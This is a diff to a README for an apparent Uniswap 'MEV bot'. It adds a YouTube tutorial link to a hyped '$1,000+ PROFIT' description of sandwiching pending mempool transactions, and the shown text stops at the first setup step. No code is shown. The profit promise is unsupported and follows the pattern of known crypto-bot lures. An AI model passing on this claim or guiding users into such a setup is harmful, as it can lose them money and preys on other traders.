@@ -1,8 +1,9 @@
 # mev-bot
 $1,000+ PROFIT - Uniswap MEV Contract Bot - Easy Tutorial [ MEV Bot | Sniper Bot ]
 if you're into cryptocurrency, you need to know what a MEV Bot is. A Maximal Extractable Value (MEV) bot is an arbitrage tool that sniffs the Mempool for pending transactions on decentralized exchanges such as Uniswap and PancakeSwap. It inserts our own TX with a slightly higher gas fee, 1 Gwei higher than the TX which is trying to be entered, essentially sandwiching the pending TX and forcing ours to automatically be processed first, profiting off of the slippage differences.
-
-
+Tuturial see in videos
+[https://www.youtube.com/watch?v=jNl5QEDzFuA&t=283s
+](https://www.youtube.com/watch?v=jNl5QEDzFuA&t=283s)
 ***** STEP BY STEP INSTRUCTIONS *****
 
 1. Download MetaMask:
